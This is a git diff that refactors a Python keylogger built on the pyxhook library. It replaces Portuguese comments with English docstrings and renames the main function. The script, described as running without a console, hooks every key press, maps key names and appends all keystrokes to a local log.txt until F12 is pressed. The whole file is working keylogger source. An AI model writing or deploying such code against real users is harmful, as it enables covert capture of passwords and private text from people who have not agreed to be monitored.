@@ -1,7 +1,22 @@
-#!/usr/bin/env python
 # -*- coding: UTF-8 -*-
+"""Keylogger 
 
+This script starts the keylogger without a console and allows you to record all keys
+entered by the user in a log.
 
+Requires `python-xlib` (pyxhook) installed inside the environment Python
+on which you are running this script. This file too can be imported as a module
+and contains the following functions:
+
+    * main_kl - Main func, iniciate the keylogger.
+
+Attributes
+----------
+file_path : str
+    The path of log.txt .
+dict_key : dict[str : str]
+    Dict with values to be changed in event.Key
+"""
 import sys # sys.exit
 from datetime import datetime
 from pathlib import Path
@@ -9,9 +24,15 @@ from os import chdir, pardir
 from os.path import dirname
 
 from KLplus import pyxhook
-# Dicionário com valores a serem modificados em event.Key por conta do tipo de 
-# keyboard, é uma solução paliativa.
-# Modificar key_code/keysym em pyxhook deve resolver.
+
+
+file_path = dirname(__file__) + '/log.txt'
+
+# Put current data on log
+with open(file_path, 'a') as file:
+    date = datetime.today().strftime('%d-%m-%Y--%H:%M:%S')
+    file.write(f'\n{date}..:\n')
+
 dict_key = {
         '[65105]':'´', 'space':' ', 'Escape':'[Esc]',
         'apostrophe':"'", 'Tab':'[Tab]', 'Caps_Lock': '[Caps_Lock]',
@@ -33,37 +54,39 @@ dict_key = {
         'Alt_L':'[Alt_L]', '[65027]':'[Alt_R]'
         }
 
-file_path = dirname(__file__) + '/log.txt' # Path do log é o mesmo do módulo.
 
-# Insere data no log ao iniciar script
-with open(file_path, 'a') as file:
-    date = datetime.today().strftime('%d-%m-%Y--%H:%M:%S')
-    file.write(f'\n{date}..:\n')
+def main_kl():
+    """Main func, iniciate the keylogger.
+    
+    Functions:
+        * write_event - Write at a log with the value of keyboard pressed.
+    """
 
-# Função principal
-def main():
-
-    # Função interna que escreve a tecla do evento em log.txt
     def write_event(event):
+        """Write at a log with the value of keyboard pressed (event.key)
 
-        # Modifica tecla de acordo com o dict global
+        Parameters
+        ----------
+        event : class(pyxhook.pyxhookkeyevent)
+            Class with info (str) of key pressed
+        """
+
+        # Change event.key by dict if...
         if event.Key in dict_key:
             event.Key = dict_key[event.Key]
     
-        # Guarda tecla em um .txt
         with open(file_path, 'a') as file:
             file.write(event.Key)
 
-        # Se F12 for pressionado, o script é finalizado
+        # Exits if 'F12' is pressed
         if event.Key == '[F12]':
             hm.cancel
             sys.exit(0)
 
-    hm = pyxhook.HookManager()  # Instancia a classe que gerencia eventos hook 
-    hm.KeyDown = write_event  # Atribui nossa função como callback do evento
-                                      # iniciado quando uma tecla é pressionada
-    hm.start()  # Inicia processos de threads (herdado de threading por pyxhook
+    hm = pyxhook.HookManager()
+    hm.KeyDown = write_event  # Assign our func as callback event "press down"
+    hm.start()  # Init threads process (hm heritage from threading by pyxhook)
 
     
 if __name__ == "__main__":
-    main()
+    main_kl()
